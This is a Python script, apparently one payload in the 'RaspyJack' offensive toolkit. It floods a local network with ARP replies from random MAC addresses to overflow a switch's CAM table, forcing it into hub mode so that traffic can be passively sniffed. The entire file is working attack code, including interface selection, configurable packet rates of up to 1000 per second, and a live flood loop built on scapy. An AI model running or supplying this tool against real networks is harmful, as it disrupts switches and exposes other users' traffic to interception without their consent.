#!/usr/bin/env python3
# @name: ARP DoS (CAM Overflow)
# @desc: CAM table overflow / ARP flooding to force a switch into hub mode.
# @category: network
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- ARP DoS (CAM Overflow)
============================================
Author: 7h30th3r0n3

CAM table overflow / ARP flooding to force a switch into hub mode.
Sends massive ARP replies with random source MACs to overflow the
switch's MAC address table.  When the table overflows, the switch
broadcasts all traffic (hub mode), enabling passive sniffing.

Controls:
  python3 arp_dos.py [iface] [speed]

    iface  -- optional network interface to flood on. If omitted and
              more than one candidate interface is found, you'll be
              prompted to pick one from a numbered list.
    speed  -- optional packets-per-second burst rate, one of:
              10, 50, 100, 500, 1000 (default: 100).

  Ctrl-C   -- stop flooding and print a summary.

Setup: No special requirements, uses scapy raw frames.
"""

from payloads._web_input import request_input
import os
import sys
import time
import random
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_interfaces

try:
    from scapy.all import Ether, ARP, sendp, conf
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SPEED_LEVELS = [10, 50, 100, 500, 1000]
SPEED_NAMES = ["10/s", "50/s", "100/s", "500/s", "1000/s"]

# Typical CAM table sizes: 2K-16K entries
ESTIMATED_CAM_SIZES = {"small": 2048, "medium": 8192, "large": 16384}
CAM_ESTIMATE = 8192

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
flooding = False
speed_idx = 2            # index into SPEED_LEVELS (default 100/s)
packets_sent = 0
start_time = 0.0
pkt_per_sec = 0.0
status_msg = "Ready"

_flood_thread = None
_iface = None

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _get_iface_ip(iface):
    """Read IPv4 address of our interface."""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", "dev", iface],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return "192.168.1.1"


def _get_subnet_base(ip):
    """Get /24 subnet base from IP."""
    parts = ip.split(".")
    if len(parts) == 4:
        return f"{parts[0]}.{parts[1]}.{parts[2]}"
    return "192.168.1"


def _random_mac():
    """Generate a random locally-administered unicast MAC."""
    octets = [random.randint(0, 255) for _ in range(6)]
    octets[0] = (octets[0] | 0x02) & 0xFE
    return ":".join(f"{b:02x}" for b in octets)


def _random_ip(subnet_base):
    """Generate a random IP in the /24 subnet."""
    return f"{subnet_base}.{random.randint(1, 254)}"


# ---------------------------------------------------------------------------
# Flood thread
# ---------------------------------------------------------------------------

def _flood_loop():
    """Send ARP replies with random MACs in bursts."""
    global packets_sent, pkt_per_sec, start_time

    iface = _iface
    my_ip = _get_iface_ip(iface)
    subnet_base = _get_subnet_base(my_ip)

    with lock:
        start_time = time.time()
        packets_sent = 0

    while running and flooding:
        burst_size = SPEED_LEVELS[speed_idx]
        burst_start = time.time()

        batch = []
        for _ in range(burst_size):
            if not running or not flooding:
                break
            src_mac = _random_mac()
            src_ip = _random_ip(subnet_base)
            dst_ip = _random_ip(subnet_base)

            pkt = (
                Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
                / ARP(
                    op=2,
                    hwsrc=src_mac,
                    psrc=src_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    pdst=dst_ip,
                )
            )
            batch.append(pkt)

        if batch:
            try:
                sendp(batch, iface=iface, verbose=False)
                with lock:
                    packets_sent += len(batch)
            except Exception:
                pass

        elapsed = time.time() - burst_start
        with lock:
            total_elapsed = time.time() - start_time
            if total_elapsed > 0:
                pkt_per_sec = packets_sent / total_elapsed

        # Sleep remainder of 1 second if burst was fast
        sleep_time = max(0.01, 1.0 - elapsed)
        # Break sleep into small chunks for responsiveness
        chunks = int(sleep_time / 0.05)
        for _ in range(chunks):
            if not running or not flooding:
                break
            time.sleep(0.05)


# ---------------------------------------------------------------------------
# Interface selection
# ---------------------------------------------------------------------------

def _select_iface(iface_arg):
    """Resolve the interface to use from an optional CLI arg or a prompt."""
    if iface_arg:
        return iface_arg

    ifaces = list_interfaces("any")
    if not ifaces:
        print("No network interface found.", flush=True)
        return None
    if len(ifaces) == 1:
        return ifaces[0]["name"]

    print("Multiple interfaces found:", flush=True)
    for i, ifc in enumerate(ifaces):
        print(f"  [{i}] {ifc['name']}  ip={ifc['ip'] or '?'}  "
              f"{'UP' if ifc['is_up'] else 'DOWN'}", flush=True)
    while True:
        choice = request_input(f"Select interface [0-{len(ifaces) - 1}]: ").strip()
        if choice.isdigit() and 0 <= int(choice) < len(ifaces):
            return ifaces[int(choice)]["name"]
        print("Invalid selection, try again.", flush=True)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def _usage():
    print(f"Usage: {os.path.basename(__file__)} [iface] [speed]", flush=True)
    print("  iface  network interface (optional; omit to auto-detect/prompt)",
          flush=True)
    print(f"  speed  packets/sec burst rate, one of: {', '.join(SPEED_NAMES)} "
          f"(default: {SPEED_NAMES[speed_idx]})", flush=True)


def main():
    global running, flooding, speed_idx, status_msg, _flood_thread, _iface

    args = sys.argv[1:]
    if args and args[0] in ("-h", "--help"):
        _usage()
        return 0

    if not SCAPY_OK:
        print("scapy not found! pip install scapy", flush=True)
        return 1

    iface_arg = args[0] if len(args) > 0 else None
    speed_arg = args[1] if len(args) > 1 else None

    if speed_arg:
        try:
            speed_val = int(speed_arg.rstrip("/s"))
        except ValueError:
            _usage()
            return 1
        if speed_val not in SPEED_LEVELS:
            _usage()
            return 1
        speed_idx = SPEED_LEVELS.index(speed_val)

    _iface = _select_iface(iface_arg)
    if not _iface:
        return 1

    print(f"[*] Interface: {_iface}  Speed: {SPEED_NAMES[speed_idx]}", flush=True)
    print("[*] Flooding CAM table with random-MAC ARP replies... "
          "(Ctrl-C to stop)", flush=True)

    with lock:
        status_msg = "Flooding..."
        flooding = True
    _flood_thread = threading.Thread(target=_flood_loop, daemon=True)
    _flood_thread.start()

    try:
        while running:
            time.sleep(1.0)
            with lock:
                ps = packets_sent
                pps = pkt_per_sec
            fill_pct = min(100, (ps / CAM_ESTIMATE) * 100)
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"[{ts}] sent={ps} rate={pps:.0f}pkt/s "
                  f"cam_fill~{fill_pct:.0f}%", flush=True)
    except KeyboardInterrupt:
        print("\n[*] Stopping flood...", flush=True)
    finally:
        running = False
        flooding = False
        if _flood_thread:
            _flood_thread.join(timeout=3)

    with lock:
        ps = packets_sent
        pps = pkt_per_sec

    print(f"[*] Summary: iface={_iface} speed={SPEED_NAMES[speed_idx]} "
          f"sent={ps} avg_rate={pps:.0f}pkt/s", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
